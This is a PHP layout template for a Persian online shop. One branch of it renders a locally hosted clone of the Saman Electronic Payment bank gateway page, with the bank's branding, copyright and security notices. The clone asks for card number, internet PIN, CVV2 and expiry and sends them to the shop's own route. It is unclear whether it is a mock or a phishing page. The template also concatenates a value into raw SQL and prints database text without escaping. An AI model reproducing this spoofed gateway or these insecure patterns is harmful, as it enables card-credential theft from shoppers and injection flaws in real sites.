<?php
/* @var $this \yii\web\View */
/* @var $content string */

use yii\helpers\Html;
use yii\helpers\Url;
use common\widgets\Alert;
use common\models\Sales;

$controller = Yii::$app->controller->id;
$action = Yii::$app->controller->action->id;
$sales = Yii::$app->getDb()->createCommand("
    SELECT `sales`.`total_cost` as `cost`, concat(concat(categories.name, ' '), `products`.`model`) AS `name`
    FROM `sales`
    INNER JOIN `products` ON sales.product_id=products.id
    INNER JOIN `categories` ON products.category=categories.id
    WHERE `sales`.`status`=1 and ip='".$_SERVER['REMOTE_ADDR']."'
    ORDER BY `sales`.`id`
")->queryAll();
?>
<?php
if ($action != 'dargah') {
    ?>
    <!DOCTYPE HTML>
    <html lang="<?= Yii::$app->language ?>">
        <head>
            <meta charset="<?= Yii::$app->charset ?>">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <meta name="author" content="iglyphic">
            <?= Html::csrfMetaTags() ?>
            <title><?= Html::encode($this->title) ?></title>
            <!--  ///////         css matrials    ////////////  -->
            <link href="<?= Url::to(['/assets/css/bootstrap.css']) ?>" type="text/css" rel="stylesheet" />
            <link href="<?= Url::to(['/assets/css/components.css']) ?>" type="text/css" rel="stylesheet" />
            <!--  ///////         font matrials    ////////////  -->
            <link href="<?= Url::to(['/assets/fonts/font-awesome-4.6.3/css/font-awesome.min.css']) ?>" type="text/css" rel="stylesheet" />
            <link href="<?= Url::to(['/assets/fonts/material-design-iconic-font/css/material-design-iconic-font.min.css']) ?>" type="text/css" rel="stylesheet" />
            <link href="<?= Url::to(['/assets/fonts/simple-line-icons-master/css/simple-line-icons.css']) ?>" type="text/css" rel="stylesheet" />
            <!--  ///////    \.     font matrials    ////////////  -->
            <!-- Main css -->
            <link href="<?= Url::to(['/assets/css/main.css']) ?>" rel="stylesheet" type="text/css">
            <link href="<?= Url::to(['/assets/css/less/public.min.css']) ?>" rel="stylesheet" type="text/css">
            <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
            <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
            <![endif]-->
            <style type="text/css">
                .affix{
                    position: fixed !important;
                    background-color: #eee !important;
                    top: 0 !important;
                    margin: 0 !important;
                    width: 100%;
                    right: 0;
                }
            </style>
        </head>

        <body class="style-2 nav-on-header<?= $action != 'search' ? '-white' : '' ?> <?= ($action != 'index' ? 'login-page' : ($action == 'search' ? 'bg-grey' : '')) ?>" style="display: block !important;">
            <!-- Start Loading -->
            <section class="loading-overlay">
                <div class="Loading-Page">
                    <h2 class="loader">درحال بارگذاری...</h2>
                </div>
            </section>
            <!-- End Loading  -->
            <!-- Start Navigation bar -->
            <nav class="navbar" data-offset-top="250" data-spy="affix">
                <div class="container">

                    <!-- Logo -->
                    <div class="pull-left">
                        <a class="navbar-toggle" href="#" data-toggle="offcanvas"><i class="ti-menu"></i></a>
                        <div class="logo-wrapper">
                            <a class="logo" href="index.html"><img src="<?= Url::to(['/assets/img/index/logo.png']) ?>" style="width: 55px;height: 55px;" alt="logo" ></a>
                            <a class="logo-alt" href="index.html" style="margin-top: 5px;margin-bottom: 10px;"><img src="<?= Url::to(['/assets/img/index/logo.png']) ?>" style="width: 55px;height: 55px;" alt="logo-alt"></a>
                        </div>
                    </div>
                    <!-- END Logo -->
                    <!-- cart -->
                    <div class="pull-right cart">
                        <ul class="icon-nav ">
                            <li class="margin-top-15"  title="پنل کاربر">
                                <div class="dropdown">
                                    <a href="" class="margin-left-30 btn btn-success font-white" id="dropdownMenu1" data-toggle="dropdown">
                                        <i class="fa fa-shopping-cart"></i>سبد خرید
                                    </a>
                                    <div class="dropdown-menu" role="menu" aria-labelledby="dropdownMenu1">
                                        <a  class="hidden "><i class="icon-close"></i></a>
                                        <header class="row padding-tb-20">
                                            <div class="col-xs-12">
                                                <strong class="margin-top-10">سبد خرید خود را مشاهده نمایید </strong><br>
                                            </div>
                                        </header>

                                        <article class="row padding-tb-20 text-right">
                                            <table class="table">
                                                <tbody>
                                                    <?php
                                                       
                                                    if ($sales) {
                                                        ?>
                                                        <tr>
                                                            <td>نام محصول</td>
                                                            <td>قیمت</td>
                                                        </tr>
                                                        <?php
                                                        foreach ($sales as $index => $sale) {
                                                            ?>
                                                            <tr>
                                                                <td><?= $sale['name'] ?></td>
                                                                <td><?= $sale['cost'] ?></td>
                                                            </tr>
                                                            <?php
                                                        }
                                                        ?>
                                                        <tr>
                                                            <td colspan="2" class="text-center">
                                                                <a class="btn btn-success btn-sm" href="<?= Url::to(['/site/payment']) ?>">تکمیل خرید</a>
                                                            </td>
                                                        </tr>
                                                        <?php
                                                    } else {
                                                        ?>
                                                        <tr>
                                                            <td colspan="2" class="text-center">--&nbsp;بدون محصول&nbsp;--</td>
                                                        </tr>
                                                        <?php
                                                    }
                                                    ?>
                                                </tbody>
                                            </table>
                                        </article>
                                    </div>
                                </div>
                            </li>
                        </ul>
                    </div>
                    <!-- cart -->
                    <!-- User account -->
                    <div class="pull-right user-login">
                        <?php
                        if (Yii::$app->user->isGuest) {
                            ?>
                            <a class="btn btn-primary padding-right-20 padding-left-20 font-white" href="<?= Url::to(['/site/login']) ?>">ورود</a> یا &nbsp;
                            <a href="<?= Url::to(['/site/signup']) ?>">ثبت نام </a>
                            <?php
                        } else {
                            ?>
                            <a href="<?= Url::to(['/site/profile']) ?>">
                                <?= Yii::$app->user->identity->fullname ?>
                                خوش آمدید,, 
                            </a>
                            <a href="<?= Url::to(['/site/logout']) ?>">خروج</a>
                            <?php
                        }
                        ?>
                    </div>
                    <!-- Navigation menu -->
                    <ul class="nav-menu user-login">
                        <li>
                            <a class="active" href="<?= Url::to(['/site/index']) ?>">صفحه اصلی</a>
                        </li>
                        <li>
                            <a href="#">لیست محصولات</a>
                            <ul>
                                <?php
                                $categories = common\models\Categories::find()->orderBy(['name' => SORT_ASC])->all();
                                foreach ($categories as $index => $category) {
                                    echo '<li><a href="' . Url::to(['/site/search', 'name' => $category->name]) . '">' . $category->name . '</a></li>';
                                }
                                ?>
                            </ul>
                        </li>

                        <li>
                            <a href="<?= Url::to(['/site/about']) ?>">درباره ی ما</a>
                        </li>
                        <li>
                            <a href="<?= Url::to(['/site/contact']) ?>">تماس با ما</a>
                        </li>

                    </ul>
                    <!-- END Navigation menu -->

                </div>
            </nav>
            <?= $content ?>
            <!-- featured product Ends -->
            <!-- start footer area -->
            <section id="index-footer" class="footer-area-content">
                <!-- Newsletter -->
                <div id="newsletter">
                    <div class="container" style="text-align: center !important;">
                        <div class="row">
                            <div class="col-md-12 text-center">
                                <h3><i class="fa fa-envelope-o margin-left-10"></i>برای دریافت اخبار ایمیل خودرا وارد نمایید.</h3>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-sm-8 center-box">
                                <div class="col-sm-8">
                                    <input type="email" required="required" placeholder="ایمیل خودرا وارد نمایید " id="email" class="form-control" name="email">
                                </div>
                                <div class="col-sm-4">
                                    <a href="#" class="btn btn-danger">اشتراک</a>
                                </div>

                            </div>
                        </div>
                    </div>
                </div>
                <!-- END: Newsletter -->

                <div class="container">
                    <div class="footer-wrapper style-3">
                        <footer class="type-1">
                            <div class="footer-columns-entry">
                                <div class="row">
                                    <div class="col-md-4 col-sm-4">
                                        <h3 class="column-title">صفحات</h3>
                                        <ul class="column">
                                            <li><a href="<?=  Url::to(['/site/index'])?>">صفحه اصلی</a></li>
                                            <li><a href="<?=  Url::to(['/site/about'])?>">درباره ی ما</a></li>
                                            <li><a href="<?=  Url::to(['/site/contact'])?>">تماس با ما</a></li>
                                        </ul>
                                        <div class="clear"></div>
                                    </div>
                                    <div class="col-md-4 col-sm-4">
                                        <h3 class="column-title">کانلالهای ارتباطی ما</h3>
                                        <ul class="column">
                                            <li><a href="telegram.me/m_qasemii">تلگرام</a></li>
                                            <li><a href="#">اینستاگرام</a></li>
                                        </ul>
                                        <div class="clear"></div>
                                    </div>

                                    <div class="col-md-4 col-sm-4">
                                        <h3 class="column-title">نماد الکترونیکی</h3>
                                        <ul class="column">
                                            دردست انجام
                                        </ul>
                                        <div class="clear"></div>
                                    </div>
                                </div>
                            </div>

                        </footer>
                    </div>
                </div>


                <div class="footer-bottom footer-wrapper style-3">

                    <div class="container">
                        <div class="row">
                            <div class="col-md-12">
                                <div class="footer-bottom-navigation">
                                    <div class="cell-view center-box">
                                        <div class="footer-links">
                                            <a href="#">نقشه سایت</a>
                                            <a href="restaurant-list.html">جستجو</a>
                                            <a href="#">پرسش و پاسخ</a>
                                            <a href="page-privacy-policy.html">حریم خصوصی</a>
                                        </div>
                                        <div class="copyright">ساخته شده توسط تیم برناممه نویسی <a target="_blank" href="#">عقاب <b style="color: red">سرخ</b></a></div>
                                        <div class="copyright">تمامی حقوق مادی و معنوی این سایت مطعلق به  <a target="_blank" href="#">شرکت ما </a>است</div>
                                    </div>
                                    <div class="cell-view center-box">
                                        <div class="social-content">
                                            <a class="post-facebook" href="facebook.com"><i class="fa fa-facebook"></i></a>
                                            <a class="post-google-plus" href="googleplus.com"><i class="fa fa-google-plus"></i></a>
                                            <a class="post-twitter" href="twittwer.com"><i class="fa fa-twitter"></i></a>
                                            <a class="linkedin" href="linkedin.com"><i class="fa fa-linkedin"></i></a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>



            </section>
            <!-- footer area end -->

            <!-- Back to top Link -->
            <div id="to-top" class="main-bg"><span class="fa fa-chevron-up"></span></div>
            <script src="<?= Url::to(['/assets/js/jquery-1.11.2.min.js']) ?>"></script>
            <script src="<?= Url::to(['/assets/js/bootstrap.min.js']) ?>"></script>
            <script defer="defer">
                $(function() {
                    $("[data-toggle = 'tooltip']").tooltip();
                });</script>
            <!-- Custom Javascript -->
            <script src="<?= Url::to(['/assets/js/index/smoothscroll.js']) ?>"></script>
            <script src="<?= Url::to(['/assets/js/index/custom.js']) ?>"></script>
        </body>
        <?php
    }
    ?>
    <?php
    if ($action == 'dargah') {
        ?>

        <!DOCTYPE html>
        <html xmlns="http://www.w3.org/1999/xhtml"><head id="Head"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>
                    درگاه پرداخت اینترنتی پرداخت الکترونیک سامان
                </title><link href="<?= Url::to(['/assets/js/styles.css']) ?>" rel="stylesheet"></head>
            <body id="Body" class="pagebody">
                <script src="<?= Url::to(['/assets/js/ScriptPayment']) ?>"></script>

                <form method="POST" action="erorr.html" id="CancelForm" name="CancelForm" autocomplete="off">
                    <input type="hidden" name="State" id="State" value="Canceled By User">
                    <input type="hidden" name="StateCode" id="StateCode" value="-1">
                    <input type="hidden" name="ResNum" value="1001800783">
                    <input type="hidden" name="MID" value="10562107">
                    <input type="hidden" name="RefNum" value="">
                    <input type="hidden" name="CID" value="">
                    <input type="hidden" name="TRACENO" value="">
                    <input type="hidden" name="RRN" value="">
                    <input type="hidden" name="SecurePan" value="">
                </form>
                <form  action="<?=  Url::to(['/site/dargah-success'])?>" >
                    <div class="aspNetHidden">
                        <input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
                        <input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
                        <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKLTU4ODc0MjE4OA9kFgJmD2QWAgIDD2QWAgIBD2QWAgIBD2QWAgIBD2QWAgIBD2QWDAIHD2QWAgIXDw8WAh4HVmlzaWJsZWdkZAIJDw8WAh4ISW1hZ2VVcmwFMS9EYXRhL01Mb2dvcy80YjAxNmE0YTQ2Zjc0NDI2YTY5NjI0NzQ3ZDY5YzIzYy5wbmdkZAILDw8WAh4EVGV4dAUk2b7Ysdiv2KfYrtiqINmF24zYstio2KfZhtuMINqp2YjahtqpZGQCDQ8PFgIfAgUIMTA1NjIxMDdkZAIPDw8WAh8CBQ1saWxob3N0aW5nLmlyZGQCEQ8PFgIfAgUGNTAsMDAwZGQYAgUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFJ2N0bDAwJG1haW5Db250ZW50JFBheW1lbnRTZXJ2aWNlMSRjdGwwMQUoY3RsMDAkbWFpbkNvbnRlbnQkUGF5bWVudFNlcnZpY2UxJGNjSm9pbg8FJDE5NDMwN2MxLTUzZTgtNDQxYS1hOWUzLTg3NWI2YTQ2NDkxZmQ=">
                    </div>

                    <script type="text/javascript">
                //<![CDATA[
                var theForm = document.forms['frmMain'];
                if (!theForm) {
                    theForm = document.frmMain;
                }
                function __doPostBack(eventTarget, eventArgument) {
                    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
                        theForm.__EVENTTARGET.value = eventTarget;
                        theForm.__EVENTARGUMENT.value = eventArgument;
                        theForm.submit();
                    }
                }
                //]]>
                    </script>


                    <script src="<?= Url::to(['/assets/js/WebResource.axd']) ?>" type="text/javascript"></script>


                    <script src="<?= Url::to(['/assets/js/ScriptResource.axd']) ?>" type="text/javascript"></script>
                    <script src="<?= Url::to(['/assets/js/ScriptResource(1).axd']) ?>" type="text/javascript"></script>
                    <div class="aspNetHidden">

                        <input type="hidden" name="__PREVIOUSPAGE" id="__PREVIOUSPAGE" value="UP15Gr_srgbWogpgGwboTXsB_19hHfgdovw3HRRfsieEBymVcYqY2o2tMXUfi26kRgauORyHnOGmweMClqlsZK5EilBTrTjDO_uOn41hXPc1">
                    </div>
                    <div id="wrapAll">
                        <div id="wrapheader">
                            <div class="top-nav">
                                <div class="container box-center">
                                    <div class="contact"><a class="logo-alt" href=""><img src="<?= Url::to(['/assets/js/logo.png']) ?>" style="width: 70px;height: 70px;" alt="logo-alt"></a></div>
                                </div>
                            </div>
                            <div class="inner container box-center">
                                <div class="menu-container">
                                    <div class=" box-center">
                                        <span class="pull-left logo"></span>
                                        <div class="pull-right logo-shaparak">
                                        </div>
                                        <div class="title">
                                            <div class="title-text">
                                                درگاه پرداخت اینترنتی پرداخت الکترونیک سامان
                                            </div>
                                        </div>
                                    </div>


                                    <div class="clear"></div>
                                </div>
                            </div>
                        </div>
                        <div class="clear"></div>

                        <div id="wrapsite">
                            <div id="wrapcenter">
                                <div class="container box-center">
                                    <div id="divCenter" class=" ">



                                        <script type="text/javascript">
                //<![CDATA[
                Sys.WebForms.PageRequestManager._initialize('ctl00$mainContent$PaymentService1$sm', 'frmMain', ['tctl00$mainContent$PaymentService1$UpdatePanel1', 'mainContent_PaymentService1_UpdatePanel1'], [], [], 90, 'ctl00');
                //]]>
                                        </script>



                                        <!--[if lt IE 9]>
                                        <script type='text/javascript' src="Js/html5shiv.js"></script>
                                        <script type='text/javascript' src="Js/Respond1.4.js"></script>
                                        <![endif]-->
                                        <input type="hidden" name="ctl00$mainContent$PaymentService1$hfSessionKey" id="mainContent_PaymentService1_hfSessionKey" value="pLrEL6RK1Ag">
                                        <div style="text-align: right; padding: 10px;" class="ui-widget ui-state-error boxmessage number">
                                            <span style="float: right; margin-left: .3em;" class="ui-icon ui-icon-alert"></span>
                                            <span class="lblMessage">شماره کارت بدرستی وارد نشده است</span>
                                        </div>
                                        <div style="text-align: right; padding: 10px;" class="ui-widget ui-state-error boxmessage negative">
                                            <span style="float: right; margin-left: .3em;" class="ui-icon ui-icon-alert"></span>
                                            <span class="lblMessage">مبلغ وارد شده منفی میباشد</span>
                                        </div>

                                        <div class="holder">
                                            <div class="card-info box col-md-8 col-xs-12 col-sm-12">
                                                <h2 class="moduletitle">
                                                    <i class="glyphicon glyphicon-credit-card"></i>اطلاعات کارت
                                                </h2>
                                                <h2 class="time">
                                                    <font class="SpecialText">
                                                    <i class="glyphicon glyphicon-time"></i>
                                                    زمان باقيمانده:
                                                    </font>
                                                    <div class="timer TimeInput timer-green">
                                                        <span id="minute">08</span>
                                                        <span id="spilit">:</span>
                                                        <span id="second">53</span>
                                                    </div>
                                                </h2>
                                                <div id="mainContent_PaymentService1_Panel1" >

                                                    <div class="form-horizontal">
                                                        <div class="form-group col">
                                                            <label for="CardNumber" class="control-label col-md-2 col-xs-12 col-sm-12">شماره کارت <span class="star">* </span></label>
                                                            <div class="col-md-6 col-xs-11 col-sm-8 card-number">

                                                                <span class="panel">
                                                                    <div id="mainContent_PaymentService1_Panel2">

                                                                        <span>
                                                                            <input name="ctl00$mainContent$PaymentService1$PAN0" maxlength="4" id="mainContent_PaymentService1_PAN0" tabindex="2" class="textbox PAN0" onkeyup="CheckVal()" data-placement="top" size="4" type="tel" dir="ltr" title="" data-toggle="tooltip" data-original-title="شماره کارت 16 یا 19 رقمی روی کارت">
                                                                        </span>
                                                                        <span>-</span>
                                                                        <span>
                                                                            <input name="ctl00$mainContent$PaymentService1$PAN1" maxlength="4" id="mainContent_PaymentService1_PAN1" tabindex="3" class="textbox PAN1" dir="ltr" onkeyup="CheckVal()" size="4" type="tel">
                                                                        </span>
                                                                        <span>-</span>
                                                                        <span>
                                                                            <input name="ctl00$mainContent$PaymentService1$PAN2" maxlength="4" id="mainContent_PaymentService1_PAN2" tabindex="4" class="textbox PAN2" dir="ltr" onkeyup="CheckVal()" size="4" type="tel">
                                                                        </span>
                                                                        <span>-</span>
                                                                        <span>
                                                                            <input name="ctl00$mainContent$PaymentService1$PAN3" maxlength="4" id="mainContent_PaymentService1_PAN3" tabindex="5" class="textbox PAN3" dir="ltr" size="4" type="tel" data-toggle="tooltip" title="" data-placement="top" data-original-title="شماره کارت 16 یا 19 رقمی روی کارت "></span>
                                                                        <span>-</span>
                                                                        <span>
                                                                            <input name="ctl00$mainContent$PaymentService1$PAN4" maxlength="3" id="mainContent_PaymentService1_PAN4" tabindex="6" class="textbox PAN4 last-pan" data-placement="top" size="3" type="tel" dir="ltr" disabled="disabled" title="" data-toggle="tooltip" style="background-color: rgb(221, 221, 221);" data-original-title="شماره کارت 16 یا 19 رقمی روی کارت">
                                                                        </span>
                                                                        <div class="clear"></div>

                                                                    </div>
                                                                </span>
                                                            </div>
                                                            <div class="right first validation">
                                                                <span id="cardnumber" class="validationerror cardnumber"></span>
                                                            </div>
                                                        </div>
                                                        <div class="form-group col">
                                                            <label for="Pin2" class="control-label col-md-2 col-xs-12 col-sm-12">رمز اینترنتی <span class="star">* </span></label>
                                                            <div class="col-md-5 col-xs-8 col-sm-8">
                                                                <input name="ctl00$mainContent$PaymentService1$PIN" type="password" maxlength="12" id="mainContent_PaymentService1_PIN" tabindex="7" class="textbox pin pass form-control is-keypad" autocomplete="off" data-placement="left" size="25" dir="ltr" title="" data-toggle="tooltip" data-original-title="رمز اینترنتی(رمز دوم) که از طریق دستگاه خودپرداز دریافت نموده اید">
                                                            </div>
                                                            <div class="right validation">
                                                                <span id="pinval" class="validationerror pin"></span>
                                                            </div>
                                                        </div>
                                                        <div class="form-group col">
                                                            <label for="Pin2" class="control-label col-md-2 col-xs-12 col-sm-12">cvv2<span class="star">* </span></label>
                                                            <div class="col-md-5 col-xs-8 col-sm-8">
                                                                <input name="ctl00$mainContent$PaymentService1$CVV" type="password" maxlength="4" id="mainContent_PaymentService1_CVV" tabindex="8" class="textbox cvv2 pass form-control is-keypad" autocomplete="off" dir="ltr" size="4" data-toggle="tooltip" title="" data-placement="left" value="" data-original-title="عدد 3 یا 4 رقمی  روی کارت یا پشت کارت">
                                                            </div>
                                                            <div class="right validation">
                                                                <span id="cvv2" class="validationerror cvv"></span>
                                                            </div>
                                                        </div>
                                                        <div class="form-group col">
                                                            <label for="Pin2" class="control-label col-md-2 col-xs-12 col-sm-12">تاريخ انقضا  <span class="star">* </span></label>
                                                            <div class="col-md-5 col-xs-10 col-sm-7 expire">
                                                                <div class="pull-right">
                                                                    <label>ماه</label>
                                                                    <input name="ctl00$mainContent$PaymentService1$ExpDateMonth" maxlength="2" id="mainContent_PaymentService1_ExpDateMonth" tabindex="9" class="textbox expm form-control" dir="ltr" size="2" type="tel" data-toggle="tooltip" title="" data-placement="top" data-original-title="ماه انقضا درج شده بر روی کارت ">
                                                                </div>
                                                                <div class="pull-right">
                                                                    <label>سال</label>
                                                                    <input name="ctl00$mainContent$PaymentService1$ExpDateYear" maxlength="2" id="mainContent_PaymentService1_ExpDateYear" tabindex="10" class="textbox expy form-control" dir="ltr" size="2" type="tel" data-toggle="tooltip" title="" data-placement="left" data-original-title=" سال انقضا درج شده بر روی کارت ">
                                                                </div>
                                                            </div>
                                                            <div class="right validation">
                                                                <span id="month" class="validationerror month"></span>
                                                                <span id="year" class="validationerror year"></span>
                                                            </div>
                                                        </div>
                                                        <div id="mainContent_PaymentService1_panelMail">

                                                            <div class="form-group col">
                                                                <label class="control-label col-md-2 col-xs-12 col-sm-12">ایمیل(اختیاری) </label>
                                                                <div class="col-md-5 col-xs-8 col-sm-8">
                                                                    <input name="ctl00$mainContent$PaymentService1$EmailUser" id="mainContent_PaymentService1_EmailUser" tabindex="11" class="form-control textbox mail" type="email" data-toggle="tooltip" title="" data-placement="left" style="direction: ltr;" data-original-title="رسید پرداخت به ایمیل ارسال خواهد شد ">
                                                                </div>
                                                                <div class="right validation">
                                                                    <span id="email" class="validationerror email"></span>
                                                                </div>
                                                            </div>

                                                        </div>
                                                        <div id="mainContent_PaymentService1_UpdatePanel1">

                                                            <div class="form-group col">
                                                                <label class="control-label col-md-2 col-xs-12 col-sm-12">کد امنیتی<span class="star">* </span></label>
                                                                <div class="col-md-2 col-xs-12 col-sm-12">
                                                                    <div id="CaptchaContainer1" align="right" style="width: 152px;">
                                                                        <div style="background-color:White;"><img src="<?= Url::to(['/assets/js/CaptchaImage.axd']) ?>" border="0" width="150" height="50"></div>
                                                                    </div>
                                                                </div>
                                                                <div class="col-md-4 col-xs-12 col-sm-12">
                                                                    <input name="ctl00$mainContent$PaymentService1$txtSecurityCode" maxlength="5" id="mainContent_PaymentService1_txtSecurityCode" tabindex="12" class="input-captcha col-md-3" type="tel" style="width:75px;direction: ltr;">
                                                                    <input type="image" name="ctl00$mainContent$PaymentService1$ctl01" class="btn-captcha col-md-1 col-md-offset-1" src="<?= Url::to(['/assets/js/refresh.png']) ?>" >
                                                                    <div id="mainContent_PaymentService1_Captchamessage" class="error-captcah">

                                                                        <span id="mainContent_PaymentService1_captcahlbl" class="error-captcah"></span>

                                                                    </div>
                                                                </div>
                                                                <div class="clear"></div>
                                                                <div class="clear"></div>
                                                            </div>

                                                        </div>
                                                        <div class="form-group col">
                                                            <label class="control-label col-md-2 col-xs-12 col-sm-2"></label>
                                                            <div class="col-md-8 col-xs-12 col-sm-4">
                                                               <a href="<?= Url::to(['/site/dargah-success']) ?>">   <input type="submit" name="ctl00$mainContent$PaymentService1$PayButton1"  value="پرداخت" id="mainContent_PaymentService1_PayButton1" class="btn btn-primary payment btn-payment"></a>
                                                               <input type="button" id="btnPayProgreess" value="در حال پردازش" class="btn btn-success payment" disabled="disabled">

                                                                <a href="<?= Url::to(['/site/errorr']) ?>"> <input type="button" name="Cancel" id="cancel" class="btn btn-danger"  value="انصراف"></a>
                                                            </div>
                                                        </div>
                                                    </div>

                                                </div>
                                            </div>
                                            <div class="merchant-info box col-md-3 col-xs-12 col-sm-12 col-md-offset-1 last">
                                                <h2 class="moduletitle">
                                                    <i class="glyphicon glyphicon-info-sign"></i>اطلاعات پذیرنده
                                                </h2>
                                                <div class="img-holder">
                                                    <table align="center" class="fixed">
                                                        <tbody><tr>
                                                                <td>
                                                                    <img id="mainContent_PaymentService1_Image1" src="<?= Url::to(['/assets/js/4b016a4a46f74426a69624747d69c23c.png']) ?>">
                                                                </td>
                                                            </tr>
                                                        </tbody></table>
                                                </div>
                                                <div style="clear: both;">
                                                    <div class="merchant-name">
                                                        <i class="glyphicon glyphicon-user"></i>
                                                        <span class="editor-label">نام پذیرنده : </span>
                                                        <span id="mainContent_PaymentService1_lbl_name" style="color:DarkRed;">مصالح عقاب سرخ</span>
                                                    </div>
                                                    <div class="merchant-code">
                                                        <i class="glyphicon glyphicon-ok-circle"></i>
                                                        <span class="editor-label">کد پذیرنده : </span>
                                                        <span id="mainContent_PaymentService1_lbl_termid" style="color:DarkRed;">10562107</span>
                                                    </div>
                                                    <div class="merchant-code">
                                                        <i class="glyphicon glyphicon-globe"></i>
                                                        <span class="editor-label">آدرس پذیرنده : </span>
                                                        <span id="mainContent_PaymentService1_lbl_WebSite" style="color:DarkRed;">masalehoghabsorkh.ir</span>
                                                    </div>
                                                    <div class="merchant-amount">
                                                        <i class="glyphicon glyphicon-certificate"></i>
                                                        <span class="editor-label">مبلغ قابل پرداخت : </span>
                                                        <font color="#8b0000">
                                                        <span id="mainContent_PaymentService1_lbl_amount" class="amount"></span>
                                                        ریال </font>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="clear"></div>
                                        </div>
                                        <div class="security-info box col-xs-12 col-sm-12 col-md-12">
                                            <h2 class="moduletitle">
                                                <i class="glyphicon glyphicon-exclamation-sign"></i>
                                                نکات امنیتی
                                            </h2>
                                            <div class="security-description">
                                                <p>
                                                    <i class="glyphicon glyphicon-ok"></i>
                                                    درگاه پرداخت اینترنتی سامان با استفاده از پروتکل امن SSL به مشتریان خود ارایه
                                                    خدمت نموده و با آدرس <font color="#8b0000">https://sep.shaparak.ir&nbsp;</font>شروع
                                                    می شود. خواهشمند است به منظور جلوگیری از سوء استفاده های احتمالی پیش از ورود هرگونه
                                                    اطلاعات، آدرس موجود در بخش مرورگر وب خود را با آدرس فوق مقایسه نمایید و درصورت مشاهده
                                                    هر نوع مغایرت احتمالی، موضوع را با ما درمیان بگذارید.
                                                </p>
                                                <p>
                                                    <i class="glyphicon glyphicon-ok"></i>
                                                    از صحت نام فروشنده و مبلغ نمایش داده شده، اطمینان حاصل فرمایید.
                                                </p>
                                                <p>
                                                    <i class="glyphicon glyphicon-ok"></i>
                                                    برای جلوگیری از افشای رمز کارت خود، حتی المقدور از صفحه کلید مجازی استفاده فرمایید.
                                                </p>
                                                <p>
                                                    <i class="glyphicon glyphicon-ok"></i>
                                                    برای کسب اطلاعات بیشتر، گزارش فروشگاههای مشکوک و همچنین اطلاع از وضعیت پذیرندگان
                                                    اینترنتی با شماره 84080 تماس بگیرید و یا از طریق ایمیل epay@sep.ir اقدام نمایید.
                                                </p>

                                            </div>
                                        </div>
                                        <div class="clear"></div>







                                    </div>
                                </div>
                                <div class="clear"></div>
                            </div>
                            <div class="divWaiting" style="display: none">
                                <span id="lblWait"> در حال پردازش ... </span>

                            </div>
                        </div>
                        <div id="wrapBottom" style="position: absolute;">
                            <div class="footer-copyright col-md-6 col-xs-12 col-sm-12">
                                تمامی حقوق این نرم افزار متعلق به شرکت پرداخت الکترونیک سامان می باشد.
                            </div>
                            <div class="footer-company col-md-6 col-sm-12 col-xs-12 pull-left ">
                                شرکت پرداخت الکترونیک سامان <span style="direction: rtl;">2008 - 2017</span>
                            </div>
                            <div class="clear"></div>
                        </div>
                        <div class="clear"></div>
                    </div>
                </form>
                <div class="clear"></div>


                <div class="keypad-popup" style="display: none;"><div class="keypad-row"><button type="button" class="keypad-key">7</button><button type="button" class="keypad-key">6</button><button type="button" class="keypad-key">3</button><button type="button" class="keypad-special keypad-close" title="بستن كيبرد">بستن</button></div><div class="keypad-row"><button type="button" class="keypad-key">5</button><button type="button" class="keypad-key">2</button><button type="button" class="keypad-key">0</button><button type="button" class="keypad-special keypad-clear" title="پاك كردن تمامي متن">پاك كردن</button></div><div class="keypad-row"><button type="button" class="keypad-key">8</button><button type="button" class="keypad-key">9</button><button type="button" class="keypad-key">4</button><button type="button" class="keypad-special keypad-back" title="تصحيح كلمه قبل">تصحيح</button></div><div class="keypad-row"><div class="keypad-space"></div><button type="button" class="keypad-key">1</button></div></div></body></html>
    </div>
    <?php
}
?>
</html>